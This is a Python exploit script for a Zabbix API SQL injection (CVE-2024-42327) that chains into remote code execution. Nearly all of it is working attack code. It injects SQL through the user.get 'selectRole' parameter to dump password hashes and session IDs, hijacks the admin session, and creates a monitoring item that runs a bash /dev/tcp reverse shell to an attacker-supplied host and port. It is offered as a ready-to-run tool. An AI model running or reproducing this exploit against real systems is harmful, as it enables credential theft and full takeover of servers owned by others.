"""
Adapted and optimized POC for Zabbix RCE.

References:
    - https://github.com/compr00t/CVE-2024-42327/blob/main/cve-2024-42327.py
    - https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE/blob/main/exploit.py
"""

import argparse
import requests


ZABBIX_API_JSON_ENDPOINT = 'api_jsonrpc.php'
ZABBIX_API_BASE_JSON = {
    "jsonrpc":"2.0",
    "id":1, 
    "method": "METHOD",
    "params":{}
}

ZABBIX_API_AUTHENTICATE_METHOD = 'user.login'
ZABBIX_API_GET_USERS = 'user.get'

BASE_SQLI_PAYLOAD = "name, (SQL_STATEMENT_HERE)"


def zabbix_api_request(api_url, method, params):
    request_json = ZABBIX_API_BASE_JSON
    request_json['method'] = method
    request_json['params'] = params

    resp = requests.get(api_url, json=request_json, verify=False)
    if not resp.json():
        print(f'[-] - Something went wrong in API request for method: {ZABBIX_API_AUTHENTICATE_METHOD}')
        print(resp.status_code)
        print(resp.content)
        return None
        
    return resp.json()


def zabbix_api_authenticate(api_url, username, password):
    method = ZABBIX_API_AUTHENTICATE_METHOD
    params = {
        "username": username,
        "password": password
    }

    resp = zabbix_api_request(api_url, method, params)
    if not resp:
        return None

    auth_token = resp.get('result', None)

    return auth_token


def zabbix_api_get_users(api_url):
    method = ZABBIX_API_GET_USERS
    params = {
        "output": ["userid", "username"], 
        "selectRole": ["type", "roleid", "name","readonly"]
    }
    resp = zabbix_api_request(api_url, method, params)
    user_details = resp.get('result', [])
    for u in user_details:
        print(u)


def sqli_leak_credentials(api_url):
    this_sql = "SELECT GROUP_CONCAT(userid, ', ', username, ', ', passwd, ', ', roleid, ' || ') FROM users"

    method = ZABBIX_API_GET_USERS
    params = {
        "output":["userid", "username"],
        "selectRole": [BASE_SQLI_PAYLOAD.replace('SQL_STATEMENT_HERE', this_sql)],
        "userids": 1
    }
    resp = zabbix_api_request(api_url, method, params)
    user_details = resp.get('result', [])
    if not user_details:
        return None

    user_details = user_details[0].get('role', {}).get(f'({this_sql})').split(' || ')
    for u in user_details:
        if u:
            userid, username, passwd, roleid = u.split(', ')
            print(f'userid: {userid.replace(",", "")}, username: {username}, password: {passwd}, roleid: {roleid}')


def sqli_leak_session_tokens(api_url):
    this_sql = "SELECT GROUP_CONCAT(userid, ', ', sessionid, ' || ') FROM sessions"

    method = ZABBIX_API_GET_USERS
    params = {
        "output":["userid", "username"],
        "selectRole": [BASE_SQLI_PAYLOAD.replace('SQL_STATEMENT_HERE', this_sql)],
        "userids": 1
    }
    resp = zabbix_api_request(api_url, method, params)
    user_details = resp.get('result', [])
    if not user_details:
        return None

    user_details = user_details[0].get('role', {}).get(f'({this_sql})').split(' || ')
    admin_session = ''
    for u in user_details:
        if u:
            userid, sessionid = u.split(', ')
            if '1' in userid:
                admin_session = sessionid
            print(f'userid: {userid.replace(",", "")}, sessionid: {sessionid}')
    return admin_session

def sqli_custom(api_url, query):
    this_sql = query

    method = ZABBIX_API_GET_USERS
    params = {
        "output":["userid", "username"],
        "selectRole": [BASE_SQLI_PAYLOAD.replace('SQL_STATEMENT_HERE', this_sql)],
        "userids": 1
    }
    resp = zabbix_api_request(api_url, method, params)
    user_details = resp.get('result', [])
    if not user_details:
        return None

    user_details = user_details[0].get('role', {}).get(f'({this_sql})')
    print(user_details)


def get_host_ids(api_url, admin_session):
    """Retrieve current host IDs and their associated interface IDs."""
    payload = {
        "jsonrpc": "2.0",
        "method": "host.get",
        "params": {
            "output": ["hostid", "host"],
            "selectInterfaces": ["interfaceid"]
        },
        "auth": admin_session,
        "id": 1
    }
    response = requests.post(api_url, json=payload)
    if response.status_code == 200:
        try:
            response_json = response.json()
            print(f"host.get response: {response_json}")
            result = response_json.get("result", [])
            if result:
                host_id = result[0]["hostid"]
                interface_id = result[0]["interfaces"][0]["interfaceid"]
                return host_id, interface_id
            else:
                print("No hosts found in the response.")
                return None, None
        except Exception as e:
            print(f"Error parsing response: {str(e)}")
            return None, None
    else:
        print(f"Failed to retrieve host IDs. HTTP status code: {response.status_code}")
        return None, None

def send_reverse_shell_request(api_url, admin_session, lhost, lport, host_id, interface_id):
    """Send the reverse shell request to the target server."""
    payload = {
        "jsonrpc": "2.0",
        "method": "item.create",
        "params": {
            "name": "rce",
            "key_": f"system.run[bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"]",
            "delay": 1,
            "hostid": host_id,
            "type": 0,
            "value_type": 1,
            "interfaceid": interface_id
        },
        "auth": admin_session,
        "id": 1
    }
    response = requests.post(api_url, json=payload)
    if response.status_code == 200:
        print("Reverse shell command executed successfully. Wait a couple seconds.")
    else:
        print(f"Failed to send reverse shell request. HTTP status code: {response.status_code}")

def perform_RCE(api_url, admin_session, lhost, lport):
    print(admin_session)
    host_id, interface_id = get_host_ids(api_url,admin_session)
    if host_id or interface_id:
        send_reverse_shell_request(api_url, admin_session, lhost, lport, host_id, interface_id)

def main():
    # Set up the argument parser
    parser = argparse.ArgumentParser(description="Accept a URL, USERNAME, PASSWORD, and an optional custom SQL query.")

    # Required arguments
    parser.add_argument('-u', '--url', type=str, help="The URL to Zabbix (please include the path -  http://example.com/zabbix/)", required=True)
    parser.add_argument('-U', '--username', type=str, help="The username to authenticate with", required=True)
    parser.add_argument('-P', '--password', type=str, help="The password to authenticate with", required=True)
    parser.add_argument('-l', '--lhost', type=str, help="The lhost to rev-shell to", required=True)
    parser.add_argument('-p', '--lport', type=int, help="The lport to rev-shell to", required=True)

    # Optional argument for SQL query
    parser.add_argument('--query', type=str, help="An optional custom SQL query to run through the SQL Injection")

    # Parse arguments
    args = parser.parse_args()

    # ensure zabbix url has protocol (assume https if nothing provided)
    zabbix_base_url = args.url
    if not zabbix_base_url.startswith('http'):
        zabbix_base_url = f'https://{zabbix_base_url}'

    # ensure url ends with /
    if not zabbix_base_url.endswith('/'):
        zabbix_base_url += '/'

    API_URL = zabbix_base_url + ZABBIX_API_JSON_ENDPOINT
    print(f'[*] - Using {API_URL} for API.')

    # Authenticate to gain session token
    print(f'\n[*] - Authenticating with username: "{args.username}" and password "{args.password}"')
    auth_token = zabbix_api_authenticate(API_URL, args.username, args.password)
    if not auth_token:
        print(f'[-] - Authentication Failed')
        return

    print('[+] - Authentication Success!')
    ZABBIX_API_BASE_JSON['auth'] = auth_token

    # custom query has been defined
    if args.query:
        print(f'\nAttempting custom SQL Query: {args.query}')
        sqli_custom(API_URL, args.query)
        return

    print('\n[*] - Getting user details')
    zabbix_api_get_users(API_URL)

    print('\n[*] - Using SQL Injection to leak user credentials')
    sqli_leak_credentials(API_URL)

    print('\n[*] - Leaking Session Tokens for API use')
    admin_session = sqli_leak_session_tokens(API_URL)
    perform_RCE(API_URL, admin_session, args.lhost, args.lport)


if __name__ == "__main__":
    main()